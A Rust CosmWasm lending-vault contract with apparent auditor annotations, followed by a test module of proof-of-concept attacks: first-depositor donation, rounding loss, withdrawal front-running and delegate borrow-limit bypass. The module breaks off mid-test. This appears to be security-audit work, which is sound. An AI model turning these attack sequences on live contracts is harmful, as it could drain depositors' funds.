use crate::borrowers::Borrower;
use crate::config::Config;
use crate::error::ContractError;
use crate::events::{event_borrow, event_deposit, event_repay, event_withdraw};
use crate::state::State;
#[cfg(not(feature = "library"))]
use cosmwasm_std::entry_point;
use cosmwasm_std::{
    coins, to_json_binary, BankMsg, Binary, Deps, DepsMut, Empty, Env, MessageInfo, Response,
    StdResult, Uint128,
};
use cw2::set_contract_version;
use cw_utils::must_pay;
use rujira_rs::ghost::vault::{
    BorrowerResponse, BorrowersResponse, ConfigResponse, DelegateResponse, ExecuteMsg,
    InstantiateMsg, MarketMsg, PoolResponse, QueryMsg, StatusResponse, SudoMsg,
};
use rujira_rs::TokenFactory;
use std::cmp::min;

const CONTRACT_NAME: &str = env!("CARGO_PKG_NAME");
const CONTRACT_VERSION: &str = env!("CARGO_PKG_VERSION");

///OK1st
/// ### constructor
#[cfg_attr(not(feature = "library"), entry_point)]
pub fn instantiate(
    deps: DepsMut,
    env: Env,
    _info: MessageInfo,
    msg: InstantiateMsg,
) -> Result<Response, ContractError> {
    set_contract_version(deps.storage, CONTRACT_NAME, CONTRACT_VERSION)?; //e migration tracking per version
                                                                          //e validate, save and persist config
    let config = Config::new(deps.api, msg.clone())?;
    config.validate()?;
    config.save(deps.storage)?;
    //e initialize the deposit and debt pools
    State::init(deps.storage, &env)?;
    //e create the namespace for receipt tokens (upon minting) (e.g. x/ghost-vault/btc)
    let rcpt = TokenFactory::new(&env, format!("ghost-vault/{}", config.denom).as_str());

    Ok(Response::default().add_message(rcpt.create_msg(msg.receipt)))
}

//e user facing methods
#[cfg_attr(not(feature = "library"), entry_point)]
/// (owner.clone(),contract.clone(),&ExecuteMsg::Deposit { callback: None },&coins(1_000u128, "btc"),)
pub fn execute(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    msg: ExecuteMsg,
) -> Result<Response, ContractError> { 
    //e update the state with accrued interest - invariant
    let config = Config::load(deps.storage)?;
    let mut state = State::load(deps.storage)?;
    let rcpt = TokenFactory::new(&env, format!("ghost-vault/{}", config.denom).as_str());
    //e accrue interest based on time -> increase deposit_pool.size() by interest -> increase debt_pool.size() by interest+fee -> last updated = now
    let fees = state.distribute_interest(&env, &config)?;
    //e depends on the msg you send (what you wanna do)
    let mut response = match msg {
        //Ok1st
        ExecuteMsg::Deposit { callback } => {
            //e payment validation (check denom and that amount > 0)
            let amount = must_pay(&info, config.denom.as_str())?;
            //e calculate how many receipt tokens to mint and update pool balance
            //e deposit_pool.total increases
            /* example
            deposit_pool.total += 1_000 btc
            exchange_rate = 1.25
            mint = 800 receipt tokens
             */
            let mint = state.deposit(amount)?;
            //e vault accounting reflects the deposit
            state.save(deps.storage)?;

            match callback {
                None => Response::default()
                //e mint receipt token message and emit deposit event
                /*
                MsgMint {
                    denom: "ghost-vault/btc",
                    amount: mint,
                    to: user
                }
                */
                    .add_message(rcpt.mint_msg(mint, info.sender.clone()))
                    .add_event(event_deposit(info.sender, amount, mint)),
                //e mint receipt token then forward to callback
                Some(cb) => Response::default()
                //e Receipt tokens minted/sent to the contract, Callback message executes and decides what to do next => Callback receives tokens as funds
                //audit-possible: re-entrancy through callback contract?
                    .add_message(rcpt.mint_msg(mint, env.contract.address))
                    .add_message(cb.to_message(
                        &info.sender,
                        Empty {},
                        coins(mint.u128(), rcpt.denom()),
                    )?)
                    //e deposit event
                    .add_event(event_deposit(info.sender, amount, mint)),
            }
        }
        ExecuteMsg::Withdraw { callback } => {
            //e make sure only 1 coin and correct denom obtained from the receipt token
            let amount = must_pay(&info, rcpt.denom().as_str())?;
            //e calculate how many receipt tokens to withdraw and update pool balance
            let withdrawn = state.withdraw(amount)?;
            //e commit the state
            state.save(deps.storage)?;

            match callback {
                //e if no callback contract, burn receipt token and emit burn event
                None => Response::default()
                    .add_message(rcpt.burn_msg(amount))
                    //e send the underlying assets through BankMsg::Send, passing the receiver address and amount and denom
                    .add_message(BankMsg::Send {
                        to_address: info.sender.to_string(),
                        amount: coins(withdrawn.u128(), config.denom),
                    })
                    //e emit withdrawal event
                    .add_event(event_withdraw(info.sender, withdrawn, amount)),
                //e if we have a callback contract address
                Some(cb) => Response::default()
                    //e create burn message
                    .add_message(rcpt.burn_msg(amount))
                    //e send underlying assets through the callback contract, without BankMsg::Send 
                    .add_message(cb.to_message(
                        &info.sender,
                        Empty {},
                        coins(withdrawn.u128(), &config.denom),
                    )?)
                    //e emit withdrawal event
                    .add_event(event_withdraw(info.sender, withdrawn, amount)),
            }
        }
        //e borrowing, repaying
        ExecuteMsg::Market(market_msg) => {
            let mut borrower = Borrower::load(deps.storage, info.sender.clone())?;
            execute_market(deps, info, &mut state, market_msg, &mut borrower)?
        }
    };
    if fees.gt(&Uint128::zero()) {
        response = response.add_message(rcpt.mint_msg(fees, config.fee_address.clone()));
    }

    Ok(response)
}

pub fn execute_market(
    deps: DepsMut,
    info: MessageInfo,
    state: &mut State,
    msg: MarketMsg,
    borrower: &mut Borrower,
) -> Result<Response, ContractError> {
    //e load the protocol configs: denom, LTC, fees, limits
    let config = Config::load(deps.storage)?;
    //e match the requested action: borrow | repay
    let response = match msg {
        //e for borrowing, accept the amount to borrow, callback contract and optional third party borrower
        MarketMsg::Borrow {
            amount,
            callback,
            delegate,
        } => {
            //e calculate the number of shares correpsonding to the requested borrow amount
            let shares = state.borrow(amount)?;
            //e check if there is delegate address
            match delegate.clone() {
                //e if delegate address is passed
                //e assign debt shares to delegate, record delegation relationship
                Some(d) => {
                    borrower.delegate_borrow(
                        deps.storage,
                        deps.api.addr_validate(&d)?,
                        &state.debt_pool,
                        shares,
                    )?;
                }
                //e if no delegate passed, the borrower borrows for themself
                None => {
                    borrower.borrow(deps.storage, &state.debt_pool, shares)?;
                }
            };
            //e check if there is callback contract
            match callback {
                //e if no callback contract 
                None => Response::default()
                    //e create send request to send the borrowed collateral to borrower
                    .add_message(BankMsg::Send {
                        to_address: info.sender.to_string(),
                        amount: coins(amount.u128(), config.denom),
                    })
                    //e emit borrowing event
                    .add_event(event_borrow(
                        borrower.addr.clone(),
                        delegate,
                        amount,
                        shares,
                    )),
                //e if there is callback contract
                //audit-possible maybe reentrancy
                Some(cb) => Response::default()
                    //e send the borrowed assets to the borrow contract alongside the sender identity
                    .add_message(cb.to_message(
                        &info.sender,
                        Empty {},
                        coins(amount.u128(), &config.denom),
                    )?)
                    //e emit borrow event
                    .add_event(event_borrow(
                        borrower.addr.clone(),
                        delegate,
                        amount,
                        shares,
                    )),
            }
        }
        //e if user want to repay
        MarketMsg::Repay { delegate } => {
            //e make sure denom is correct and only 1 coin
            let amount = must_pay(&info, config.denom.as_str())?;
            //e validate the delegate address 
            let delegate_address = delegate
                .clone()
                .map(|d| deps.api.addr_validate(&d))
                .transpose()?;
            //e if there is no delegate, the borrower shares are the same he borrowed, else its the delegate shares associated with the delegate obtained from storage
            let borrower_shares = match delegate_address.as_ref() {
                Some(d) => borrower.delegate_shares(deps.storage, d.clone()),
                None => borrower.shares,
            };
            //e calculate the debt he owes: borrower_debt = borrower_shares / total_shares * total_debt
            let borrower_debt = state.debt_pool.ownership(borrower_shares);
            //e calculate how much to repay, which is minimum between the debt he owes and the amount he borrowed
            //e If amount > debt → excess refunded later | If amount < debt → partial repayment
            let repay_amount = min(amount, borrower_debt);
            //e convert repayment amount to shares
            let shares = state.repay(repay_amount)?;
            //e check if we have a delegate
            match delegate_address.clone() {
                //e if we have a delegate, substract shares from his debt and write that to storage
                Some(d) => borrower.delegate_repay(deps.storage, d, shares),
                //e else substract from borrower
                None => borrower.repay(deps.storage, shares),
            }?;
            //e building the response and emit event
            let mut response = Response::default().add_event(event_repay(
                borrower.addr.clone(),
                delegate,
                repay_amount,
                shares,
            ));
            //e prevent underflow with checked_sub, give back any excess
            let refund = amount.checked_sub(repay_amount)?;
            //e refund always goes to transaction sender not the delegate
            if !refund.is_zero() {
                response = response.add_message(BankMsg::Send {
                    to_address: info.sender.to_string(),
                    amount: coins(refund.u128(), &config.denom),
                });
            }
            response
        }
    };
    state.save(deps.storage)?;
    Ok(response)
}

//e privileged entry point
#[cfg_attr(not(feature = "library"), entry_point)]
pub fn sudo(deps: DepsMut, _env: Env, msg: SudoMsg) -> Result<Response, ContractError> {
    //e load the storage
    let mut config = Config::load(deps.storage)?;
    //e check if we want to set the borrower (update borrow limit) or set the interest
    match msg {
        //e if we want to update borrower contract, pass limit
        SudoMsg::SetBorrower { contract, limit } => {
            //e set the new limit to the contract after first validating the address (valid bech32)
            Borrower::set(deps.storage, deps.api.addr_validate(&contract)?, limit)?;
            Ok(Response::default())
        }
        //e update interest rate model
        SudoMsg::SetInterest(interest) => {
            //e validate new interest value
            interest.validate()?;
            config.interest = interest;
            //e save new interest value to storage
            config.save(deps.storage)?;
            Ok(Response::default())
        }
    }
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn query(deps: Deps, env: Env, msg: QueryMsg) -> Result<Binary, ContractError> {
    //e load the state and configs from storage
    let mut state = State::load(deps.storage)?;
    let config = Config::load(deps.storage)?;
    //e ensures the query shows up to date values
    state.distribute_interest(&env, &config)?;

    match msg {
        QueryMsg::Config {} => Ok(to_json_binary(&ConfigResponse {
            denom: config.denom,
            interest: config.interest,
        })?),

        QueryMsg::Status {} => Ok(to_json_binary(&StatusResponse {
            debt_rate: state.debt_rate(&config.interest)?,
            lend_rate: state.lend_rate(&config.interest)?,
            utilization_ratio: state.utilization(),
            last_updated: state.last_updated,
            debt_pool: PoolResponse {
                size: state.debt_pool.size(),
                shares: state.debt_pool.shares(),
                ratio: state.debt_pool.ratio(),
            },
            deposit_pool: PoolResponse {
                size: state.deposit_pool.size(),
                shares: state.deposit_pool.shares(),
                ratio: state.deposit_pool.ratio(),
            },
        })?),
        QueryMsg::Borrower { addr } => {
            let borrower = Borrower::load(deps.storage, deps.api.addr_validate(&addr)?)?;
            let current = state.debt_pool.ownership(borrower.shares);
            Ok(to_json_binary(&BorrowerResponse {
                addr: borrower.addr.to_string(),
                denom: config.denom,
                limit: borrower.limit,
                current,
                shares: borrower.shares,
                available: min(
                    // Current borrows can exceed limit due to interest
                    borrower.limit.checked_sub(current).unwrap_or_default(),
                    state.deposit_pool.size() - state.debt_pool.size(),
                ),
            })?)
        }
        QueryMsg::Delegate { borrower, addr } => {
            let borrower = Borrower::load(deps.storage, deps.api.addr_validate(&borrower)?)?;
            let delegate = borrower.delegate_shares(deps.storage, deps.api.addr_validate(&addr)?);
            let current = state.debt_pool.ownership(borrower.shares);

            Ok(to_json_binary(&DelegateResponse {
                borrower: BorrowerResponse {
                    addr: borrower.addr.to_string(),
                    denom: config.denom,
                    limit: borrower.limit,
                    current,
                    shares: borrower.shares,
                    available: min(
                        borrower.limit.checked_sub(current).unwrap_or_default(),
                        state.deposit_pool.size() - state.debt_pool.size(),
                    ),
                },
                addr,
                current: state.debt_pool.ownership(delegate),
                shares: delegate,
            })?)
        }
        QueryMsg::Borrowers { limit, start_after } => {
            let borrowers = Borrower::list(
                deps.storage,
                limit,
                start_after
                    .map(|x| deps.api.addr_validate(x.as_str()))
                    .transpose()?,
            )
            .map(|x| {
                x.map(|borrower| {
                    let current = state.debt_pool.ownership(borrower.shares);

                    BorrowerResponse {
                        addr: borrower.addr.to_string(),
                        denom: config.denom.clone(),
                        limit: borrower.limit,
                        current,
                        shares: borrower.shares,
                        available: min(
                            // Current borrows can exceed limit due to interest
                            borrower.limit.checked_sub(current).unwrap_or_default(),
                            state.deposit_pool.size() - state.debt_pool.size(),
                        ),
                    }
                })
            })
            .collect::<StdResult<Vec<BorrowerResponse>>>()?;
            Ok(to_json_binary(&BorrowersResponse { borrowers })?)
        }
    }
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn migrate(deps: DepsMut, _env: Env, _msg: ()) -> Result<Response, ContractError> {
    set_contract_version(deps.storage, CONTRACT_NAME, CONTRACT_VERSION)?;
    crate::borrowers::migrate(deps.storage)?;
    Ok(Response::default())
}

#[cfg(all(test, feature = "mock"))]
mod tests {

    use std::str::FromStr;

    use super::*;
    use cosmwasm_std::{coin, Decimal, Event, Uint128};
    use cw_multi_test::{ContractWrapper, Executor};
    use rujira_rs::{ghost::vault::Interest, TokenMetadata};
    use rujira_rs_testing::mock_rujira_app;

    #[test]
    fn lifecycle() {
        let mut app = mock_rujira_app();
        let owner = app.api().addr_make("owner");
        let borrower = app.api().addr_make("borrower");

        app.init_modules(|router, _, storage| {
            router
                .bank
                .init_balance(storage, &owner, coins(1_000_000, "btc"))
                .unwrap();
            router
                .bank
                .init_balance(storage, &borrower, coins(1_000_000, "btc"))
                .unwrap();
        });

        let code = Box::new(ContractWrapper::new(execute, instantiate, query).with_sudo(sudo));
        let code_id = app.store_code(code);
        let contract = app
            .instantiate_contract(
                code_id,
                owner.clone(),
                &InstantiateMsg {
                    denom: "btc".to_string(),
                    receipt: TokenMetadata {
                        description: "".to_string(),
                        display: "".to_string(),
                        name: "".to_string(),
                        symbol: "".to_string(),
                        uri: None,
                        uri_hash: None,
                    },
                    interest: Interest {
                        target_utilization: Decimal::from_ratio(8u128, 10u128),
                        base_rate: Decimal::from_ratio(1u128, 10u128),
                        step1: Decimal::from_ratio(1u128, 10u128),
                        step2: Decimal::from_ratio(3u128, 1u128),
                    },
                    fee: Decimal::zero(),
                    fee_address: owner.to_string(),
                },
                &[],
                "template",
                None,
            )
            .unwrap();

        // First deposit
        let res: cw_multi_test::AppResponse = app
            .execute_contract(
                owner.clone(),
                contract.clone(),
                &ExecuteMsg::Deposit { callback: None },
                &coins(1_000u128, "btc"),
            )
            .unwrap();
        //custom print
        println!("Execute contract content: {:?}", res);

        res.assert_event(
            &Event::new("wasm-rujira-ghost-vault/deposit").add_attributes(vec![
                ("amount", "1000"),
                ("owner", owner.as_str()),
                ("shares", "1000"),
            ]),
        );

        res.assert_event(&Event::new("mint").add_attributes(vec![
            ("amount", "1000"),
            ("denom", "x/ghost-vault/btc"),
            ("recipient", owner.as_str()),
        ]));

        // Withdraw some

        let res = app
            .execute_contract(
                owner.clone(),
                contract.clone(),
                &ExecuteMsg::Withdraw { callback: None },
                &coins(200u128, "x/ghost-vault/btc"),
            )
            .unwrap();

        res.assert_event(
            &Event::new("wasm-rujira-ghost-vault/withdraw").add_attributes(vec![
                ("amount", "200"),
                ("owner", owner.as_str()),
                ("shares", "200"),
            ]),
        );

        res.assert_event(
            &Event::new("burn")
                .add_attributes(vec![("amount", "200"), ("denom", "x/ghost-vault/btc")]),
        );

        // Whitelist a borrower address
        app.wasm_sudo(
            contract.clone(),
            &SudoMsg::SetBorrower {
                contract: borrower.to_string(),
                limit: Uint128::from(500u128),
            },
        )
        .unwrap();

        let b: BorrowerResponse = app
            .wrap()
            .query_wasm_smart(
                contract.clone(),
                &QueryMsg::Borrower {
                    addr: borrower.to_string(),
                },
            )
            .unwrap();
        assert_eq!(b.addr, borrower.to_string());
        assert_eq!(b.limit, Uint128::from(500u128));
        assert_eq!(b.current, Uint128::zero());

        // Check we can't borrow more than the limit
        app.execute_contract(
            borrower.clone(),
            contract.clone(),
            &ExecuteMsg::Market(MarketMsg::Borrow {
                callback: None,
                amount: Uint128::from(501u128),
                delegate: None,
            }),
            &[],
        )
        .unwrap_err();

        // Borrow the whole lot,
        let res = app
            .execute_contract(
                borrower.clone(),
                contract.clone(),
                &ExecuteMsg::Market(MarketMsg::Borrow {
                    callback: None,
                    amount: Uint128::from(500u128),
                    delegate: None,
                }),
                &[],
            )
            .unwrap();

        res.assert_event(
            &Event::new("wasm-rujira-ghost-vault/borrow").add_attributes(vec![
                ("borrower", borrower.as_str()),
                ("amount", "500"),
                ("shares", "500"),
            ]),
        );

        res.assert_event(
            &Event::new("transfer")
                .add_attributes(vec![("amount", "500btc"), ("recipient", borrower.as_str())]),
        );

        // Now repay with the required asset
        let res = app
            .execute_contract(
                borrower.clone(),
                contract.clone(),
                &ExecuteMsg::Market(MarketMsg::Repay { delegate: None }),
                &[coin(100, "btc")],
            )
            .unwrap();

        res.assert_event(
            &Event::new("wasm-rujira-ghost-vault/repay").add_attributes(vec![
                ("amount", "100"),
                ("borrower", borrower.as_str()),
                ("shares", "100"),
            ]),
        );

        app.update_block(|x| x.time = x.time.plus_days(90));

        // Check the rate has increased
        let status: StatusResponse = app
            .wrap()
            .query_wasm_smart(contract.clone(), &QueryMsg::Status {})
            .unwrap();
        assert_eq!(
            status.utilization_ratio,
            Decimal::from_str("0.509803921568627451").unwrap()
        );
        assert_eq!(status.debt_pool.size, Uint128::from(416u128));
        assert_eq!(status.debt_pool.shares, Uint128::from(400u128));
        assert_eq!(status.debt_pool.ratio, Decimal::from_str("1.04").unwrap());
        assert_eq!(status.deposit_pool.size, Uint128::from(816u128));
        assert_eq!(status.deposit_pool.shares, Uint128::from(800u128));
        assert_eq!(
            status.deposit_pool.ratio,
            Decimal::from_str("1.02").unwrap()
        );

        // Make another deposit
        let res = app
            .execute_contract(
                owner.clone(),
                contract.clone(),
                &ExecuteMsg::Deposit { callback: None },
                &coins(1_000u128, "btc"),
            )
            .unwrap();

        // Ensure that < 1000 tokens are minted to accommodate the increase in interest payments
        res.assert_event(
            &Event::new("wasm-rujira-ghost-vault/deposit").add_attributes(vec![
                ("amount", "1000"),
                ("owner", owner.as_str()),
                ("shares", "980"),
            ]),
        );

        res.assert_event(&Event::new("mint").add_attributes(vec![
            ("amount", "980"),
            ("denom", "x/ghost-vault/btc"),
            ("recipient", owner.as_str()),
        ]));

        // finally check that a 1:1 repay doesn't work, and that more btc is required

        // debt rate is 1.0325

        let res = app
            .execute_contract(
                borrower.clone(),
                contract.clone(),
                &ExecuteMsg::Market(MarketMsg::Repay { delegate: None }),
                &[coin(104, "btc")],
            )
            .unwrap();
        res.assert_event(
            &Event::new("wasm-rujira-ghost-vault/repay").add_attributes(vec![
                ("amount", "104"),
                ("borrower", borrower.as_str()),
                ("shares", "100"),
            ]),
        );

        // Lastly check that the value of my deposit has increased
        let res = app
            .execute_contract(
                owner.clone(),
                contract.clone(),
                &ExecuteMsg::Withdraw { callback: None },
                &coins(200u128, "x/ghost-vault/btc"),
            )
            .unwrap();

        res.assert_event(
            &Event::new("wasm-rujira-ghost-vault/withdraw").add_attributes(vec![
                ("amount", "204"),
                ("owner", owner.as_str()),
                ("shares", "200"),
            ]),
        );

        res.assert_event(
            &Event::new("burn")
                .add_attributes(vec![("amount", "200"), ("denom", "x/ghost-vault/btc")]),
        );

        // Check complete repayument
        app.execute_contract(
            borrower.clone(),
            contract.clone(),
            &ExecuteMsg::Market(MarketMsg::Repay { delegate: None }),
            &[coin(312, "btc")],
        )
        .unwrap();

        // Check the rate has increased
        let status: StatusResponse = app
            .wrap()
            .query_wasm_smart(contract.clone(), &QueryMsg::Status {})
            .unwrap();

        assert_eq!(status.utilization_ratio, Decimal::zero());
        assert_eq!(status.debt_pool.size, Uint128::zero());
        assert_eq!(status.debt_pool.shares, Uint128::zero());
        assert_eq!(status.debt_pool.ratio, Decimal::zero());
        assert_eq!(status.deposit_pool.size, Uint128::from(1612u128));
        assert_eq!(status.deposit_pool.shares, Uint128::from(1580u128));
        assert_eq!(
            status.deposit_pool.ratio,
            Decimal::from_str("1.020253164556962025").unwrap()
        );
    }
}
#[cfg(all(test, feature = "mock"))]
mod exploit_tests {
    use super::*;
    use cosmwasm_std::{coin, coins, Decimal, Uint128, to_json_binary, WasmMsg, CosmosMsg};
    use cw_multi_test::{ContractWrapper, Executor};
    use rujira_rs::{ghost::vault::Interest, TokenMetadata, CallbackMsg as RujiraCallbackMsg};
    use rujira_rs_testing::mock_rujira_app;

    // Helper to setup the vault contract
    fn setup_vault() -> (
        rujira_rs_testing::RujiraApp, 
        cosmwasm_std::Addr, 
        cosmwasm_std::Addr, 
        cosmwasm_std::Addr
    ) {
        let mut app = mock_rujira_app();
        let owner = app.api().addr_make("owner");
        let attacker = app.api().addr_make("attacker");

        app.init_modules(|router, _, storage| {
            router
                .bank
                .init_balance(storage, &owner, coins(10_000_000, "btc"))
                .unwrap();
            router
                .bank
                .init_balance(storage, &attacker, coins(10_000_000, "btc"))
                .unwrap();
        });

        let code = Box::new(ContractWrapper::new(execute, instantiate, query).with_sudo(sudo));
        let code_id = app.store_code(code);
        let contract = app
            .instantiate_contract(
                code_id,
                owner.clone(),
                &InstantiateMsg {
                    denom: "btc".to_string(),
                    receipt: TokenMetadata {
                        description: "".to_string(),
                        display: "".to_string(),
                        name: "".to_string(),
                        symbol: "".to_string(),
                        uri: None,
                        uri_hash: None,
                    },
                    interest: Interest {
                        target_utilization: Decimal::from_ratio(8u128, 10u128),
                        base_rate: Decimal::from_ratio(1u128, 10u128),
                        step1: Decimal::from_ratio(1u128, 10u128),
                        step2: Decimal::from_ratio(3u128, 1u128),
                    },
                    fee: Decimal::from_ratio(1u128, 100u128), // 1% fee
                    fee_address: owner.to_string(),
                },
                &[],
                "vault",
                None,
            )
            .unwrap();

        (app, owner, attacker, contract)
    }

    /// POC 1: First Depositor Attack
    /// 
    /// Attacker deposits 1 unit, then donates directly to the contract to inflate
    /// the share price, causing subsequent depositors to lose value through rounding.
    #[test]
    fn exploit_first_depositor_attack() {
        let (mut app, owner, attacker, vault_contract) = setup_vault();

        println!("\n=== First Depositor Attack ===");
        
        // Step 1: Attacker deposits minimal amount (1 unit)
        let _res = app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(1, "btc"),
        ).unwrap();
        
        println!("Step 1: Attacker deposits 1 btc");
        
        // Check shares received
        let attacker_shares = app
            .wrap()
            .query_balance(attacker.clone(), "x/ghost-vault/btc")
            .unwrap();
        println!("Attacker receives {} shares", attacker_shares.amount);

        // Step 2: Attacker donates directly to the vault (not through deposit function)
        // This inflates the value per share without minting new shares
        app.send_tokens(
            attacker.clone(),
            vault_contract.clone(),
            &coins(1_000_000, "btc"),
        ).unwrap();
        
        println!("Step 2: Attacker donates 1,000,000 btc directly to contract");

        // Step 3: Check vault state
        let status: StatusResponse = app
            .wrap()
            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
            .unwrap();
        
        println!("Deposit pool size: {}", status.deposit_pool.size);
        println!("Deposit pool shares: {}", status.deposit_pool.shares);
        println!("Ratio: {}", status.deposit_pool.ratio);

        // Step 4: Victim deposits 1,000,000 btc
        println!("\nStep 3: Victim deposits 1,000,000 btc");
        let _res = app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(1_000_000, "btc"),
        ).unwrap();

        let victim_shares = app
            .wrap()
            .query_balance(owner.clone(), "x/ghost-vault/btc")
            .unwrap();
        println!("Victim receives {} shares", victim_shares.amount);

        // Step 5: Attacker withdraws
        println!("\nStep 4: Attacker withdraws");
        let _attacker_withdraw = app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Withdraw { callback: None },
            &[coin(attacker_shares.amount.u128(), "x/ghost-vault/btc")],
        ).unwrap();

        let attacker_final_btc = app
            .wrap()
            .query_balance(attacker.clone(), "btc")
            .unwrap();
        
        println!("Attacker final BTC balance: {}", attacker_final_btc.amount);
        
        // Calculate profit
        let initial_investment = 1_000_001; // 1 + 1,000,000 donated
        let profit = attacker_final_btc.amount.u128() as i128 - (10_000_000 - initial_investment) as i128;
        
        if profit > 0 {
            println!("🚨 EXPLOIT SUCCESSFUL!");
            println!("Attacker profit: {} btc", profit);
            println!("Victim lost value due to rounding!");
        } else {
            println!("✅ Attack mitigated or unprofitable");
        }
    }

    /// POC 2: Precision Loss Exploitation
    /// 
    /// Small deposits/withdrawals can cause rounding errors that accumulate
    #[test]
    fn exploit_precision_loss() {
        let (mut app, owner, attacker, vault_contract) = setup_vault();

        println!("\n=== Precision Loss Attack ===");

        // Create initial pool state
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(1_000_000, "btc"),
        ).unwrap();

        // Attacker makes many small deposits and withdrawals to accumulate rounding errors
        let initial_balance = app.wrap().query_balance(attacker.clone(), "btc").unwrap();
        println!("Attacker initial balance: {}", initial_balance.amount);

        for i in 0..100 {
            // Deposit small amount
            let deposit_res = app.execute_contract(
                attacker.clone(),
                vault_contract.clone(),
                &ExecuteMsg::Deposit { callback: None },
                &coins(10, "btc"),
            );

            if deposit_res.is_ok() {
                // Immediately withdraw
                let shares = app
                    .wrap()
                    .query_balance(attacker.clone(), "x/ghost-vault/btc")
                    .unwrap();
                
                if shares.amount.u128() > 0 {
                    let _ = app.execute_contract(
                        attacker.clone(),
                        vault_contract.clone(),
                        &ExecuteMsg::Withdraw { callback: None },
                        &[coin(shares.amount.u128(), "x/ghost-vault/btc")],
                    );
                }
            }

            if i % 10 == 0 {
                println!("Completed {} iterations", i);
            }
        }

        let final_balance = app.wrap().query_balance(attacker.clone(), "btc").unwrap();
        println!("Attacker final balance: {}", final_balance.amount);

        let profit = final_balance.amount.u128() as i128 - initial_balance.amount.u128() as i128;
        if profit > 0 {
            println!("🚨 EXPLOIT SUCCESSFUL!");
            println!("Profit from rounding errors: {} btc", profit);
        } else if profit < -1000 {
            println!("⚠️  Attacker lost significant value to rounding: {} btc", -profit);
        } else {
            println!("✅ Rounding handled correctly (loss: {} btc)", -profit);
        }
    }

    /// POC 3: Withdrawal Front-Running (No Slippage Protection)
    /// 
    /// Attacker front-runs victim's withdrawal by manipulating pool ratio
    #[test]
    fn exploit_no_slippage_protection() {
        let (mut app, owner, attacker, vault_contract) = setup_vault();

        println!("\n=== Front-Running Attack (No Slippage Protection) ===");

        // Setup: Owner and attacker both deposit
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(1_000_000, "btc"),
        ).unwrap();

        app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(1_000_000, "btc"),
        ).unwrap();

        println!("Initial deposits: owner=1M, attacker=1M btc");

        // Check initial state
        let status: StatusResponse = app
            .wrap()
            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
            .unwrap();
        println!("Pool size: {}, shares: {}, ratio: {}", 
            status.deposit_pool.size, 
            status.deposit_pool.shares,
            status.deposit_pool.ratio
        );

        // Owner wants to withdraw 100k shares
        let owner_shares_before = app
            .wrap()
            .query_balance(owner.clone(), "x/ghost-vault/btc")
            .unwrap();
        
        // Calculate expected withdrawal BEFORE attack
        let expected_withdrawal = owner_shares_before.amount.u128() / 10; // Withdraw 10%
        println!("\nOwner plans to withdraw {} shares", expected_withdrawal);
        println!("Expected to receive ~{} btc at current ratio", 
            (expected_withdrawal as f64 * status.deposit_pool.ratio.to_string().parse::<f64>().unwrap_or(1.0)) as u128
        );

        // ATTACKER FRONT-RUNS: Withdraws large amount to change ratio
        println!("\n🚨 ATTACKER FRONT-RUNS by withdrawing large amount...");
        let attacker_shares = app
            .wrap()
            .query_balance(attacker.clone(), "x/ghost-vault/btc")
            .unwrap();
        
        app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Withdraw { callback: None },
            &[coin(attacker_shares.amount.u128() / 2, "x/ghost-vault/btc")],
        ).unwrap();

        // Check new state after front-run
        let status_after: StatusResponse = app
            .wrap()
            .query_wasm_smart(vault_contract.clone(), &QueryMsg::Status {})
            .unwrap();
        println!("After front-run - Pool size: {}, ratio: {}", 
            status_after.deposit_pool.size,
            status_after.deposit_pool.ratio
        );

        // Owner's withdrawal executes at worse ratio
        println!("\nOwner's withdrawal executes...");
        let owner_btc_before = app.wrap().query_balance(owner.clone(), "btc").unwrap();
        
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Withdraw { callback: None },
            &[coin(expected_withdrawal, "x/ghost-vault/btc")],
        ).unwrap();

        let owner_btc_after = app.wrap().query_balance(owner.clone(), "btc").unwrap();
        let actual_received = owner_btc_after.amount.u128() - owner_btc_before.amount.u128();
        
        println!("Owner received: {} btc", actual_received);
        
        let expected_approx = (expected_withdrawal as f64 * status.deposit_pool.ratio.to_string().parse::<f64>().unwrap_or(1.0)) as u128;
        let slippage = expected_approx as i128 - actual_received as i128;
        
        if slippage > 1000 {
            println!("🚨 SIGNIFICANT SLIPPAGE: {} btc", slippage);
            println!("Owner got sandwiched due to no slippage protection!");
        } else {
            println!("✅ Slippage minimal: {} btc", slippage);
        }
    }

    /// POC 4: Delegate Borrow Limit Bypass
    /// 
    /// Attacker tries to bypass borrow limits by delegating to multiple addresses
    #[test]
    fn exploit_delegate_limit_bypass() {
        let (mut app, owner, attacker, vault_contract) = setup_vault();

        println!("\n=== Delegate Borrow Limit Bypass ===");

        // Setup: Create liquidity
        app.execute_contract(
            owner.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Deposit { callback: None },
            &coins(10_000_000, "btc"),
        ).unwrap();

        // Whitelist attacker with 100k limit
        app.wasm_sudo(
            vault_contract.clone(),
            &SudoMsg::SetBorrower {
                contract: attacker.to_string(),
                limit: Uint128::from(100_000u128),
            },
        ).unwrap();

        println!("Attacker whitelisted with 100k btc borrow limit");

        // Attacker tries to borrow more by delegating to themselves
        println!("\nAttempt 1: Borrow 50k directly");
        let res1 = app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
            &ExecuteMsg::Market(MarketMsg::Borrow {
                callback: None,
                amount: Uint128::from(50_000u128),
                delegate: None,
            }),
            &[],
        );
        println!("Result: {:?}", if res1.is_ok() { "SUCCESS" } else { "FAILED" });

        // Try to borrow more by delegating to another address
        let delegate1 = app.api().addr_make("delegate1");
        println!("\nAttempt 2: Borrow another 50k via delegate");
        let res2 = app.execute_contract(
            attacker.clone(),
            vault_contract.clone(),
